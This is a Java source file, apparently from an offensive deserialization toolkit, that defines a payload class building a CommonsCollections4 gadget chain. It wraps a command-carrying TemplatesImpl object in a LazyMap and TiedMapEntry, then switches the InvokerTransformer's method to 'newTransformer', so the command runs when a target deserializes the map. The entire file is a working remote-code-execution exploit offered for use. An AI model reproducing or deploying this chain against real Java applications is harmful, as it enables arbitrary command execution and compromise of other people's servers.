package core.payload;


import core.util.Util;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.util.HashMap;
import java.util.Map;


/**
 * Dependency: CommonsCollections4 = 4.0
 */
public class CCK2 implements ObjectPayload {
    @Override
    public Object getObjectPayload(String command) {
        Object tpl = Util.createTemplates(command);
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        HashMap<String, String> innerMap = new HashMap<String, String>();
        Map m = LazyMap.lazyMap(innerMap, transformer);

        Map outerMap = new HashMap();
        TiedMapEntry tied = new TiedMapEntry(m, tpl);
        outerMap.put(tied, "t");
        // clear the inner map data, this is important
        innerMap.clear();

        Util.setFieldValue(transformer, "iMethodName", "newTransformer");

        return outerMap;
    }
}
